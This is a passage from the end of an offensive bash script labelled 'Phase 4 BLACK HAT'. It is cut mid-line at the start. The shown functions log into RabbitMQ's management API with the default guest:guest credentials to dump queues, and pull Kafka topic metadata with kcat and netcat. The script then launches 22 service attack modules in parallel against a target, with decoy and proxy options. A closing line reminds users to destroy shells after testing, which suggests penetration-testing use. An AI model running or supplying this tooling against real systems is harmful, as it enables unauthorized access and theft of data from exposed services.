            | tee "$OUTDIR/cassandra_roles.txt" &
    fi

    wait
    _good "Cassandra complete"
}

# ------------------------------------------------------------------
# SERVICE: RABBITMQ — DEFAULT CREDS + MANAGEMENT
# ------------------------------------------------------------------
_rabbitmq() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)5672|15672|25672(,|$)"; then return; fi
    _log "=== RabbitMQ ==="

    if echo "$OPEN_PORTS" | grep -q "15672"; then
        timeout 8 curl -s $CURL_PROXY "http://${TARGET}:15672/api/overview" \
            -u guest:guest 2>/dev/null | tee "$OUTDIR/rabbitmq_api.txt" &
        timeout 8 curl -s $CURL_PROXY "http://${TARGET}:15672/api/queues" \
            -u guest:guest 2>/dev/null >> "$OUTDIR/rabbitmq_queues.txt" &
    fi

    wait
    _good "RabbitMQ complete"
}

# ------------------------------------------------------------------
# SERVICE: KAFKA — METADATA LEAK
# ------------------------------------------------------------------
_kafka() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)9092(,|$)"; then return; fi
    _log "=== Kafka ==="

    if command -v kcat &>/dev/null; then
        timeout 10 kcat -b "$TARGET:9092" -L 2>/dev/null \
            | tee "$OUTDIR/kafka_topics.txt" &
    fi

    # Manual metadata request
    timeout 5 bash -c "echo '' | nc -w 3 $TARGET 9092 | xxd" \
        2>/dev/null > "$OUTDIR/kafka_banner.txt" &

    wait
    _good "Kafka complete"
}

# ------------------------------------------------------------------
# SERVICE: CASSANDRA — already done above
# ------------------------------------------------------------------

# ------------------------------------------------------------------
# EXECUTION: FIRE EVERYTHING IN PARALLEL — MAX AGGRESSION
# ------------------------------------------------------------------
_log "=== LAUNCHING ALL SERVICE PWN MODULES (MAX TIME: ${MAX_TIME}s) ==="
_log "Target: $TARGET"
_log "Ports: $OPEN_PORTS"
_log ""

# Export for subshells
export TARGET OPEN_PORTS OPEN_UDP OUTDIR CURL_PROXY NMAP_OPTS NMAP_DECOY

# All modules fire in parallel — 8 at a time
_parallel 8 \
    "_web" "_smb" "_snmp" "_rdp" "_dns" \
    "_mssql" "_mysql" "_postgres" "_ssh" "_ftp" \
    "_redis" "_elastic" "_ldap" "_kerberos" "_nfs" \
    "_memcached" "_vnc" "_ipmi" "_mongodb" "_cassandra" \
    "_rabbitmq" "_kafka"

# ------------------------------------------------------------------
# FINAL: COMPILE FINDINGS + CLEANUP
# ------------------------------------------------------------------
END_TS=$(date +%s)
ELAPSED=$(( END_TS - START_TS ))

echo ""
echo "═══════════════════════════════════════════════"
_good "Phase 4 BLACK HAT complete in ${ELAPSED}s"
echo ""

if [[ -f "$OUTDIR/finds.txt" ]]; then
    echo -e "${RED}=== CRITICAL FINDINGS ===${NC}"
    sort -u "$OUTDIR/finds.txt" | while IFS= read -r line; do
        echo -e "${RED}►${NC} $line"
    done
fi

echo ""
echo "Output directory: $OUTDIR"
echo "Findings:         $OUTDIR/finds.txt"
echo ""
echo "${YEL}[!] REMINDER:${NC} Destroy any shells/access immediately after testing"
echo "═══════════════════════════════════════════════"
